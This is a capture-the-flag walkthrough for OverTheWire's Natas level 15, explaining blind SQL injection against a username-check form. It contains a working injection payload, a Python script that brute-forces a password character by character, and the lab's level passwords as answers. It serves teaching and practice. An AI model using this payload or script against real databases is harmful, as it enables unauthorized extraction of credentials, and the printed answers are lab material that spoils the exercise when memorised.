# Natas Level 15 → 16

## Goal

The form here only tells you whether a username exists — it doesn't print anything useful. That's a **blind SQL injection**. You extract the password for `natas16` one character at a time by asking yes/no questions in SQL.

## Concepts you'll learn

- **Blind SQL injection**: the server's response tells you *true* or *false* without revealing data, and you extract information bit by bit
- MySQL functions `LIKE BINARY` (case-sensitive match) and `SUBSTRING` for slicing
- Automating the extraction with a Python loop

## Walkthrough

### 1. View the source

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
    echo "This user exists.";
} else {
    echo "This user doesn't exist.";
}
```

Only "This user exists" / "This user doesn't exist." — binary feedback.

### 2. Learn two things at once

Inject a query that asks "does a user named `natas16` exist AND does its password start with X?" If the password starts with the guessed character, it's "This user exists"; otherwise "doesn't exist."

Payload (in the `username` field):

```
natas16" AND password LIKE BINARY "a%" #
```

The resulting SQL:

```sql
SELECT * from users where username="natas16" AND password LIKE BINARY "a%" #"
```

- If `natas16`'s password starts with `a`, you get "exists."
- `LIKE BINARY` makes the match case-sensitive so `a` ≠ `A`.
- `#` comments out the trailing quote.

### 3. Brute-force character by character

Python:

```python
import requests
from requests.auth import HTTPBasicAuth

URL = "http://natas15.natas.labs.overthewire.org/index.php"
AUTH = HTTPBasicAuth("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")
CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

password = ""
while True:
    found = None
    for c in CHARS:
        payload = f'natas16" AND password LIKE BINARY "{password}{c}%" #'
        r = requests.post(URL, data={"username": payload}, auth=AUTH)
        if "This user exists" in r.text:
            found = c
            break
    if not found:
        break
    password += found
    print(password)

print("Final:", password)
```

Run it. It iterates one character at a time, printing its progress, and stops when no extension works (meaning the password has ended). A few minutes later:

```
Final: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```

## The answer

The password for `natas16` is:

**`WaIHEacj63wnNIBROHeqi3p9t0m5nhmh`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <http://natas15.natas.labs.overthewire.org/>
